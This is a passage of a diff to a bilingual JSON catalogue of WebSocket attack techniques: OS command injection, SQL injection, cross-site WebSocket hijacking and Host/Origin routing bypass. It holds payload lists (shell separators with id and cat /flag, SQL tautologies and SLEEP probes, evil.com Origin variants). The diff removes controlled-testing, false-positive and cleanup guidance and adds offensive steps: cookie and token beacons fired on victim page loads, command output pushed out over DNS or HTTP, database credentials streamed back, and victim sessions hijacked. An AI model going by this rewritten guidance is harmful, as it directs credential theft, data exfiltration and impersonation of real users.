-            "zh": "对消息 schema 做严格验证，默认使用 textContent，富文本通过维护的消毒器和 CSP 处理，并在存储与回放路径一致编码。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Validate the message schema strictly, default to textContent, sanitize allowed rich text with a maintained library and CSP, and encode consistently during storage and replay. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "把载荷换成 Cookie 与令牌外带脚本，受害者每次打开消息页即触发回连，收集会话材料冒充其身份操作。",
+            "en": "Swap in cookie/token beacon scripts; every victim page open fires a callback, harvesting session material for impersonation."
           }
         }
       ],
@@ -752,63 +752,66 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 消息到 OS 命令注入聚焦24 行按 type/message 与 action/sendMessage 信封覆盖 `|`、`;`、`||`、`&&`，属于后端命令注入而不是 XSS。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Message-to-OS Command Injection focuses on this boundary: The 24 lines cover `|`, `;`, `||`, and `&&` across type/message and action/sendMessage envelopes and target backend command injection rather than XSS. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "WebSocket 消息到 OS 命令注入针对后端把 WebSocket 消息拼入操作系统命令的场景：两种 JSON 信封的内容字段覆盖 |、;、||、&& 分隔符。验证消息注入后的响应与后续页面输出。",
+          "en": "WebSocket message-to-OS command injection targets backends splicing WebSocket messages into OS commands: two JSON envelope content fields cover the |, ;, ||, and && separators. It validates response and downstream page output after message injection."
         },
         "vulnerability": {
-          "zh": "WebSocket 消息内容被拼入 Shell 字符串或 shell=true 子进程，分隔符因此改变后端命令结构。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "WebSocket message content is concatenated into a shell string or shell-enabled child process, allowing separators to alter backend command structure. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "WebSocket 消息内容被拼入 Shell 字符串或 shell=true 子进程，分隔符因此改变后端命令结构；风险必须落到实际消息 sink、认证主体或后端资源，不能从字符串外观推断。",
+          "en": "WebSocket message content is spliced into shell strings or shell=true child processes, letting separators change backend command structure; risk must rest on the actual message sink, authenticated principal, or backend resources—string appearance alone proves nothing."
         },
         "exploitation": {
-          "zh": "用普通文本和同闭合的无害分隔符标记形成对照，一次只测试一个信封与分隔符并关联进程审计。 阳性是 WebSocket 请求派生第二个标记进程；服务器回显字符串、消息发送成功、客户端控制台执行或后端返回通用错误都是假阳性。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Use plaintext and a harmless separator marker with identical closure as controls, testing one envelope and separator at a time with process-audit correlation. Positive evidence is a second marker process derived from the WebSocket request; server reflection, successful sending, client-console execution, or a generic backend error is false positive. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "按第 1 步在 WebSocket 连接上逐条发送 {\"type\":\"message\",\"content\":\"|id\"} 等信封样例，覆盖 |、;、||、&& 分隔符与 id/whoami 等命令；命中判据为 WebSocket 响应或后续页面内容出现命令输出。逐条记录信封格式、响应帧与会话状态，区分消息回显与命令输出；确认可控后以读取标记文件的无害命令取证。",
+          "en": "Per step 1, send {\"type\":\"message\",\"content\":\"|id\"} and similar envelope samples over the WebSocket connection one by one, covering |, ;, ||, and && separators with id/whoami-style commands; a hit is command output in the WebSocket response or downstream page content. Record envelope format, response frames, and session state per sample, distinguishing message echo from command output; after confirming control, gather evidence with harmless marker-file reads."
         },
         "mitigation": {
-          "zh": "使用固定程序与 argv，不将消息送入 Shell；对 schema、类型和枚举动作严格允许列表，并限制 worker 子进程权限。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Use a fixed executable and argv without a shell, strictly allowlist schema, types, and actions, and restrict worker child-process privileges. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "使用固定程序与 argv，不将消息送入 Shell；对 schema、类型和枚举动作严格允许列表，并限制 worker 子进程权限。修复后重放相同对照，合法 WebSocket 功能应保留，越权能力或解析差异应消失。",
+          "en": "Use fixed programs with argv and never feed messages into shells; strictly allowlist schemas, types, and enumerated actions, and restrict worker child-process permissions. After the fix, replay the same contrasts—legitimate WebSocket features persist while privilege escalation or parsing differences disappear."
         },
         "difficulty": "expert"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 后端命令 sink前置条件",
-            "en": "Confirm WebSocket Backend Command Sink prerequisites"
+            "zh": "建立连接摸清消息格式",
+            "en": "Connect and learn the message format"
           },
           "description": {
-            "zh": "24 行按 type/message 与 action/sendMessage 信封覆盖 `|`、`;`、`||`、`&&`，属于后端命令注入而不是 XSS。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 24 lines cover `|`, `;`, `||`, and `&&` across type/message and action/sendMessage envelopes and target backend command injection rather than XSS. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "连接 WebSocket 观察消息信封与字段结构，确定可注入的字段。命中判据：消息结构可以被构造复现。",
+            "en": "Connect and study the envelope/fields to find injectable spots. Success: messages can be crafted."
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 后端命令 sink对照",
-            "en": "Run a controlled WebSocket Backend Command Sink comparison"
+            "zh": "注入分隔符消息执行",
+            "en": "Fire separator messages"
           },
           "description": {
-            "zh": "用普通文本和同闭合的无害分隔符标记形成对照，一次只测试一个信封与分隔符并关联进程审计。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Use plaintext and a harmless separator marker with identical closure as controls, testing one envelope and separator at a time with process-audit correlation. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "在 content 字段提交竖线与分号前缀的命令消息。命中判据：响应或后续页面出现命令输出，为下一步利用保留完整的输出内容。",
+            "en": "Send messages whose content leads with | or ; commands. Success: output appears in responses."
           },
-          "payload": "{\"type\":\"message\",\"content\":\"|id\"}\n{\"type\":\"message\",\"content\":\"|whoami\"}\n{\"type\":\"message\",\"content\":\"|cat /flag\"}\n{\"type\":\"message\",\"content\":\"|ls /\"}\n{\"type\":\"message\",\"content\":\";id\"}\n{\"type\":\"message\",\"content\":\";whoami\"}\n{\"type\":\"message\",\"content\":\";cat /flag\"}\n{\"type\":\"message\",\"content\":\";ls /\"}\n{\"type\":\"message\",\"content\":\"||id\"}\n{\"type\":\"message\",\"content\":\"||whoami\"}\n{\"type\":\"message\",\"content\":\"||cat /flag\"}\n{\"type\":\"message\",\"content\":\"||ls /\"}\n{\"type\":\"message\",\"content\":\"&&id\"}\n{\"type\":\"message\",\"content\":\"&&whoami\"}\n{\"type\":\"message\",\"content\":\"&&cat /flag\"}\n{\"type\":\"message\",\"content\":\"&&ls /\"}\n{\"action\":\"sendMessage\",\"data\":\"|id\"}\n{\"action\":\"sendMessage\",\"data\":\"|whoami\"}\n{\"action\":\"sendMessage\",\"data\":\"|cat /flag\"}\n{\"action\":\"sendMessage\",\"data\":\"|ls /\"}\n{\"action\":\"sendMessage\",\"data\":\";id\"}\n{\"action\":\"sendMessage\",\"data\":\";whoami\"}\n{\"action\":\"sendMessage\",\"data\":\";cat /flag\"}\n{\"action\":\"sendMessage\",\"data\":\";ls /\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 后端命令 sink阳性边界",
-            "en": "Verify WebSocket Backend Command Sink positive boundaries"
-          },
-          "description": {
-            "zh": "阳性是 WebSocket 请求派生第二个标记进程；服务器回显字符串、消息发送成功、客户端控制台执行或后端返回通用错误都是假阳性。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence is a second marker process derived from the WebSocket request; server reflection, successful sending, client-console execution, or a generic backend error is false positive. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 后端命令 sink",
-            "en": "Remediate and regress WebSocket Backend Command Sink"
+            "zh": "扩大信封分隔符组合",
+            "en": "Widen envelope and separator combos"
           },
           "description": {
-            "zh": "使用固定程序与 argv，不将消息送入 Shell；对 schema、类型和枚举动作严格允许列表，并限制 worker 子进程权限。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Use a fixed executable and argv without a shell, strictly allowlist schema, types, and actions, and restrict worker child-process privileges. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "换 type 与 action 信封及 ||、&& 组合扩大命中面。命中判据：更多组合可以触发命令执行。",
+            "en": "Rotate envelopes and ||/&& combos to widen coverage. Success: more combos trigger execution."
+          }
+        },
+        {
+          "title": {
+            "zh": "外带命令输出",
+            "en": "Exfiltrate command output"
+          },
+          "description": {
+            "zh": "把命令输出经 DNS 或 HTTP 通道外带并集中收集。命中判据：接收端收到外带的数据，同时排除缓存或随机因素干扰。",
+            "en": "Push command output out over DNS or HTTP. Success: the collector receives it."
           }
         }
       ],
@@ -878,63 +881,60 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 消息 SQL 注入聚焦16 行覆盖两个信封中的布尔、UNION 列数与 MySQL 时间条件，真实类别是 SQL 注入。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Message SQL Injection focuses on this boundary: The 16 lines cover Boolean, UNION column counts, and MySQL timing conditions in two envelopes and belong to SQL injection. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "覆盖 WebSocket 消息字段的 SQL 注入验证：在 type/message 与 action/sendMessage 信封中测试布尔、UNION 与时间条件，确认消息字段是否拼入数据库查询。",
+          "en": "Covers SQL injection verification over WebSocket message fields: testing boolean, UNION, and timing conditions inside type/message and action/sendMessage envelopes to confirm whether message fields are concatenated into database queries."
         },
         "vulnerability": {
-          "zh": "消息字段未经类型约束与参数绑定就拼入 SQL，WebSocket 传输层不会自动提供数据库安全。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "A message field is concatenated into SQL without type constraints or parameter binding; WebSocket transport provides no database safety. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因是消息字段未经类型约束与参数绑定就拼入 SQL，WebSocket 传输层不自动提供数据库安全；判定标准是查询结果、数据库审计或统计延时与条件对应。",
+          "en": "The root cause is message fields concatenated into SQL without type constraints or parameter binding — the WebSocket transport grants no automatic database safety; the decision standard is query results, database audit, or statistical latency corresponding to conditions."
         },
         "exploitation": {
-          "zh": "先用普通文本和真假条件比较固定记录，再按已识别 DBMS 选择一个 UNION 或短时间探针，避免混用方言。 查询结果、数据库审计或统计延时必须与条件对应；消息 ACK、连接关闭、SQL 字样回显或单次慢响应不构成注入。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Compare plaintext and true or false predicates against fixed rows, then choose one UNION or short timing probe for the identified DBMS without mixing dialects. Query results, database audit, or statistical timing must track the condition; an acknowledgment, disconnect, reflected SQL text, or one slow response is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "使用第 1 步命令经 WebSocket 以两种消息格式发送恒真、UNION 与 SLEEP 注入；返回结果异常扩大或响应延迟约 3-5 秒即确认 WS 消息可达 SQL 拼接层。先用普通文本与真假条件比较固定记录，再按已识别 DBMS 选择一个 UNION 或短时间探针，避免混用方言。",
+          "en": "Use the step 1 command to send always-true, UNION, and SLEEP injections through both WebSocket message formats; abnormally enlarged result sets or roughly 3-5 second response delays confirm WS messages reach the SQL concatenation layer. Compare fixed records with plain text and true/false conditions first, then pick one UNION or short timing probe per the identified DBMS, never mixing dialects."
         },
         "mitigation": {
-          "zh": "对消息 schema 做类型验证并使用预编译参数，动态标识符映射允许列表，限制数据库账户并统一错误。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Validate message types and use prepared parameters, map dynamic identifiers to allowlists, restrict the database account, and normalize errors. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "对消息 schema 做类型验证并使用预编译参数，动态标识符映射允许列表，限制数据库账户并统一错误；修复后重放对照应保留合法功能且注入无效。",
+          "en": "Type-validate message schemas with prepared-statement parameters, map dynamic identifiers via allowlists, restrict database accounts, and unify errors; after the fix, replaying controls must preserve legitimate functionality with injections inert."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 数据库查询 sink前置条件",
-            "en": "Confirm WebSocket Database Query Sink prerequisites"
+            "zh": "消息字段提交布尔条件",
+            "en": "Submit boolean conditions via WS messages"
           },
           "description": {
-            "zh": "16 行覆盖两个信封中的布尔、UNION 列数与 MySQL 时间条件，真实类别是 SQL 注入。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 16 lines cover Boolean, UNION column counts, and MySQL timing conditions in two envelopes and belong to SQL injection. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "消息内容字段提交恒真与注释闭合语句，响应消息内容差异或数据库报错出现，即确认查询通道存在注入点，注入通道成立。",
+            "en": "Push OR tautologies with comment closures in the content field; message deltas or SQL errors confirm an injectable query path."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 数据库查询 sink对照",
-            "en": "Run a controlled WebSocket Database Query Sink comparison"
+            "zh": "联合查询变体深化注入",
+            "en": "Deepen the injection with UNION variants"
           },
           "description": {
-            "zh": "先用普通文本和真假条件比较固定记录，再按已识别 DBMS 选择一个 UNION 或短时间探针，避免混用方言。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Compare plaintext and true or false predicates against fixed rows, then choose one UNION or short timing probe for the identified DBMS without mixing dialects. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "换联合查询空值占位递增对齐列数，消息返回中出现占位回显即结构对齐，为数据读取定位到输出位置，读取路线确定。",
+            "en": "Grow UNION SELECT NULL padding; placeholders surfacing in the reply mean alignment is done and echo slots are located."
           },
-          "payload": "{\"type\":\"message\",\"content\":\"' OR '1'='1\"}\n{\"type\":\"message\",\"content\":\"' OR '1'='1'--\"}\n{\"type\":\"message\",\"content\":\"' OR '1'='1'#\"}\n{\"type\":\"message\",\"content\":\"' UNION SELECT NULL--\"}\n{\"type\":\"message\",\"content\":\"' UNION SELECT NULL,NULL--\"}\n{\"type\":\"message\",\"content\":\"' UNION SELECT NULL,NULL,NULL--\"}\n{\"type\":\"message\",\"content\":\"' AND SLEEP(3)--\"}\n{\"type\":\"message\",\"content\":\"' AND SLEEP(5)--\"}\n{\"action\":\"sendMessage\",\"data\":\"' OR '1'='1\"}\n{\"action\":\"sendMessage\",\"data\":\"' OR '1'='1'--\"}\n{\"action\":\"sendMessage\",\"data\":\"' OR '1'='1'#\"}\n{\"action\":\"sendMessage\",\"data\":\"' UNION SELECT NULL--\"}\n{\"action\":\"sendMessage\",\"data\":\"' UNION SELECT NULL,NULL--\"}\n{\"action\":\"sendMessage\",\"data\":\"' UNION SELECT NULL,NULL,NULL--\"}\n{\"action\":\"sendMessage\",\"data\":\"' AND SLEEP(3)--\"}\n{\"action\":\"sendMessage\",\"data\":\"' AND SLEEP(5)--\"}"
-        },
-        {
-          "title": {
-            "zh": "核对WebSocket 数据库查询 sink阳性边界",
-            "en": "Verify WebSocket Database Query Sink positive boundaries"
-          },
-          "description": {
-            "zh": "查询结果、数据库审计或统计延时必须与条件对应；消息 ACK、连接关闭、SQL 字样回显或单次慢响应不构成注入。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Query results, database audit, or statistical timing must track the condition; an acknowledgment, disconnect, reflected SQL text, or one slow response is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归WebSocket 数据库查询 sink",
-            "en": "Remediate and regress WebSocket Database Query Sink"
+            "zh": "接数据库对应提取链",
+            "en": "Chain into the DB-specific extraction flow"
           },
           "description": {
-            "zh": "对消息 schema 做类型验证并使用预编译参数，动态标识符映射允许列表，限制数据库账户并统一错误。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Validate message types and use prepared parameters, map dynamic identifiers to allowlists, restrict the database account, and normalize errors. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "按识别出的数据库类型接入对应枚举语句，把表结构与口令数据经消息通道逐批带回控制端完成数据收割，数据陆续落地。",
+            "en": "Attach the DB-appropriate enumeration statements and stream schema and credentials back through the WS channel in batches."
           }
         }
       ],
@@ -1004,63 +1004,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "跨站 WebSocket 劫持的 Origin 校验聚焦20 行是手工 Origin 解析变体；浏览器脚本不能任意设置 Origin，因此测试需区分代理重放与真实跨站浏览器条件。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "Origin Validation for Cross-Site WebSocket Hijacking focuses on this boundary: The 20 lines are manual Origin parser variants; browser script cannot arbitrarily set Origin, so proxy replay must be distinguished from a real cross-site browser condition. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖跨站 WebSocket 劫持的 Origin 校验场景，检验握手对来源头的严格程度与凭据借用的可达性。验证维度为 null、拼接与控制字符 Origin 的绕过矩阵，对应第 1 步。",
+          "en": "This payload covers CSWSH Origin validation, testing handshake strictness on source headers and reachability of credential borrowing. Validation is a bypass matrix of null, concatenated and control-character Origins, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "服务器依赖 Cookie 认证却不验证 Origin 或用后缀/子串错误匹配，攻击者页面可借受害者会话打开连接。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "The server relies on cookie authentication without validating Origin or uses flawed suffix or substring matching, allowing an attacker page to open a socket with the victim session. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于握手端点的 Origin 校验使用包含匹配或接受空值：跨站页面借浏览器自动附带的会话完成握手并读取推送数据，形成会话劫持。",
+          "en": "The root cause is handshake Origin checks using containment matching or accepting null: cross-site pages complete handshakes on automatically attached sessions and read pushed data, achieving session hijack."
         },
         "exploitation": {
-          "zh": "先从真实跨站页面发起握手，观察浏览器 Origin；仅在解析单元测试中逐个使用 null、端口、编码和相似域变体。 阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Initiate a handshake from a real cross-site page and observe the browser Origin, using null, port, encoding, and lookalike variants only in parser-focused tests. Positive evidence requires an accepted cross-site browser socket with a valid session that can perform or read one controlled authorized operation; a 101 response or proxy-forged Origin alone is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本把 Origin 绕过变体逐条置于握手请求发送并记录握手结果：任一跨站来源完成握手且收到消息即确认校验缺失，用合成 marker 验证消息可读性。成功判据以握手成功与消息接收为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, place Origin bypass variants into handshake requests one by one per the script, recording outcomes; any cross-site origin completing a handshake and receiving messages confirms missing validation, verified for message readability with synthetic markers. Judge success by handshake success and message reception. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "对规范化后的 scheme/host/port 做精确 Origin 允许列表，拒绝 null/缺失来源，使用 SameSite/CSRF 设计与消息级授权。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Use an exact allowlist over canonical scheme, host, and port, reject null or absent origins, and combine SameSite or CSRF design with message-level authorization. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "握手端点按预注册 Origin 白名单精确匹配并拒绝空值，敏感频道在消息层再校验会话权限。修复后重放第 1 步矩阵，全部绕过变体应握手失败。",
+          "en": "Handshake endpoints must exact-match pre-registered Origin allowlists rejecting null, with sensitive channels re-checking session permissions at the message layer. After the fix, replay the step 1 matrix: every bypass variant should fail its handshake."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认CSWSH Origin 校验前置条件",
-            "en": "Confirm CSWSH Origin Validation prerequisites"
+            "zh": "定位 WebSocket 端点",
+            "en": "Locate the WebSocket endpoint"
           },
           "description": {
-            "zh": "20 行是手工 Origin 解析变体；浏览器脚本不能任意设置 Origin，因此测试需区分代理重放与真实跨站浏览器条件。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The 20 lines are manual Origin parser variants; browser script cannot arbitrarily set Origin, so proxy replay must be distinguished from a real cross-site browser condition. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "抓包或阅读前端脚本找出 WS 握手地址，确认连接依赖 Cookie 会话；浏览器发起即自动携带凭据，具备跨站劫持的条件。",
+            "en": "Find the WS handshake URL via traffic or front-end code and confirm cookie-based sessions; browser-initiated connections carry credentials automatically."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控CSWSH Origin 校验对照",
-            "en": "Run a controlled CSWSH Origin Validation comparison"
+            "zh": "发送 Origin 绕过变体",
+            "en": "Fire Origin bypass variants"
           },
           "description": {
-            "zh": "先从真实跨站页面发起握手，观察浏览器 Origin；仅在解析单元测试中逐个使用 null、端口、编码和相似域变体。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Initiate a handshake from a real cross-site page and observe the browser Origin, using null, port, encoding, and lookalike variants only in parser-focused tests. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
+            "zh": "用 null、子域拼接、Tab 与 NUL 及 CRLF 编码等 Origin 变体逐条发起握手；任一变体返回 101 并接受消息即绕过 Origin 校验。",
+            "en": "Attempt handshakes with null, subdomain-joined, tab/NUL and CRLF-encoded Origin variants; any 101 that accepts messages defeats the Origin check."
           },
-          "payload": "Origin: null\nOrigin: https://target.com.evil.com\nOrigin: https://evil.com%09target.com\nOrigin: https://evil.com%00target.com\nOrigin: https://evil.com%0d%0atarget.com\nOrigin: https://evil.com.target.com\nOrigin: https://target.com:443\nOrigin: https://target.com:8080\nOrigin: https://target.com:8443\nOrigin: https://target.com/\nOrigin: https://target.com%2f\nOrigin: https://target.com%252f\nOrigin: https://target.com%23evil.com\nOrigin: https://target.com#evil.com\nOrigin: https://target.com\\evil.com\nOrigin: https://target.com%5cevil.com\nOrigin: http://target.com\nOrigin: ws://target.com\nOrigin: wss://target.com\nOrigin:"
-        },
-        {
-          "title": {
-            "zh": "核对CSWSH Origin 校验阳性边界",
-            "en": "Verify CSWSH Origin Validation positive boundaries"
-          },
-          "description": {
-            "zh": "阳性要求跨站浏览器连接被接受、会话身份有效且可执行/读取一项受控授权操作；101 响应或变造 Origin 被代理接受不够。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。",
-            "en": "Positive evidence requires an accepted cross-site browser socket with a valid session that can perform or read one controlled authorized operation; a 101 response or proxy-forged Origin alone is insufficient. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client."
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "修复并回归CSWSH Origin 校验",
-            "en": "Remediate and regress CSWSH Origin Validation"
+            "zh": "跨站劫持 WS 会话",
+            "en": "Hijack the WS session cross-site"
           },
           "description": {
-            "zh": "对规范化后的 scheme/host/port 做精确 Origin 允许列表，拒绝 null/缺失来源，使用 SameSite/CSRF 设计与消息级授权。 重放正常、阳性和阴性样例并完成测试数据清理。",
-            "en": "Use an exact allowlist over canonical scheme, host, and port, reject null or absent origins, and combine SameSite or CSRF design with message-level authorization. Replay normal, positive, and negative cases and complete test-data cleanup."
+            "zh": "在攻击者页面借受害者会话上下文连接 WS 并调用受保护动作；以其身份收到数据或触发操作即完成跨站 WebSocket 劫持。",
+            "en": "From the attacker page open the WS under the victim's session and invoke protected actions; data or side effects under their identity complete the CSWSH."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         }
       ],
@@ -1130,63 +1131,64 @@
       ],
       "tutorial": {
         "overview": {
-          "zh": "WebSocket 握手 Host 与 Origin 路由校验聚焦八行混合 Host 与已废弃草案头 Sec-WebSocket-Origin；RFC 6455 浏览器使用标准 Origin，二者不能互相替代。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。",
-          "en": "WebSocket Handshake Host and Origin Routing Validation focuses on this boundary: The eight lines mix Host with the legacy draft header Sec-WebSocket-Origin; RFC 6455 browsers use standard Origin, so the headers are not interchangeable. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline."
+          "zh": "该 Payload 覆盖 WebSocket 握手阶段的 Host 与 Origin 路由校验场景，检验虚拟主机选择与来源策略的一致性。验证维度为端口、拼接主机与旧式来源头的变体矩阵，对应第 1 步。",
+          "en": "This payload covers handshake-stage Host and Origin routing validation for WebSockets, testing consistency between vhost selection and source policy. Validation is a variant matrix of ports, concatenated hosts and legacy source headers, mapped to step 1."
         },
         "vulnerability": {
-          "zh": "代理按 Host 路由而应用按另一头校验，或服务信任客户端可伪造的旧式头，可能造成跨虚拟主机连接与策略绕过。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。",
-          "en": "A proxy may route by Host while the application validates another header, or a service may trust a forgeable legacy header, causing cross-virtual-host connections and policy bypass. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance."
+          "zh": "根因在于握手路由信任 Host 与旧式来源头而缺少白名单：变体写法让请求命中非预期虚拟主机或绕过来源策略，握手照常建立。",
+          "en": "The root cause is handshake routing trusting Host and legacy source headers without allowlists: variant spellings land requests on unintended vhosts or bypass source policy, and handshakes still establish."
         },
         "exploitation": {
-          "zh": "对真实浏览器握手记录标准头，再由协议客户端分别改变 Host 和旧式头，一次只修改一个字段并核对路由目标。 阳性要求请求被路由到非预期服务且获得不应有的会话/消息权限；101、不同证书错误或旧头被忽略都不足。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。",
-          "en": "Record standard headers from a real browser handshake, then change Host and the legacy header separately with a protocol client while checking the routed destination. Positive evidence requires routing to an unintended service with unauthorized session or message capability; a 101 response, certificate error difference, or ignored legacy header is insufficient. Correlate browser DevTools, handshake or message logs, and backend audit to establish explicit positive and negative controls."
+          "zh": "第 1 步按脚本把 Host 与来源头变体逐条置于握手请求发送并记录路由选择与握手结果：任一变体命中非预期虚拟主机或绕过来源策略仍完成握手即确认校验缺陷。成功判据以握手成功矩阵为准。占位符在全局变量菜单替换。",
+          "en": "In step 1, place Host and source-header variants into handshake requests one by one per the script, recording routing choices and handshake outcomes; any variant landing on unintended vhosts or completing handshakes despite source policy confirms the validation defect. Judge success by the handshake-success matrix. Replace placeholders via the global variables menu."
         },
         "mitigation": {
-          "zh": "代理和应用使用一致的规范 Host/Origin 允许列表，绑定 Upgrade 到预期虚拟主机，忽略旧式头并在消息层重新授权。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。",
-          "en": "Use consistent canonical Host and Origin allowlists across proxy and application, bind Upgrade to the intended virtual host, ignore legacy headers, and authorize again at message level. Replay the same controls after remediation; valid browser or WebSocket behavior should remain while unauthorized capability or parsing differences disappear."
+          "zh": "握手端点固定虚拟主机选择并校验 Host 白名单，来源策略统一基于标准 Origin 头。修复后重放第 1 步矩阵，全部变体应被路由拒绝或握手 403。",
+          "en": "Pin vhost selection with Host allowlist checks at handshake endpoints, unifying source policy on the standard Origin header. After the fix, replay the step 1 matrix: every variant should be route-refused or handshake-403."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认WebSocket 握手路由前置条件",
-            "en": "Confirm WebSocket Handshake Routing prerequisites"
+            "zh": "侦察握手路由处理",
+            "en": "Scout handshake routing"
           },
           "description": {
-            "zh": "八行混合 Host 与已废弃草案头 Sec-WebSocket-Origin；RFC 6455 浏览器使用标准 Origin，二者不能互相替代。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。",
-            "en": "The eight lines mix Host with the legacy draft header Sec-WebSocket-Origin; RFC 6455 browsers use standard Origin, so the headers are not interchangeable. Record normal behavior, component versions, security headers, message schema, and relevant logs."
+            "zh": "记录正常 WS 握手的 Host 与 Origin 头及路由落点；确认代理按 Host 分发即锁定可篡改的路由字段，作为后续攻击目标。",
+            "en": "Record Host/Origin on a normal handshake and where it lands; proxy-by-Host routing marks the field to tamper with."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "执行受控WebSocket 握手路由对照",
-            "en": "Run a controlled WebSocket Handshake Routing comparison"
+            "zh": "篡改 Host 与旧式头",
+            "en": "Tamper Host and legacy headers"
           },
           "description": {
-            "zh": "对真实浏览器握手记录标准头，再由协议客户端分别改变 Host 和旧式头，一次只修改一个字段并核对路由目标。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。",
-            "en": "Record standard headers from a real browser handshake, then change Host and the legacy header separately with a protocol client while checking the routed destination. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker."
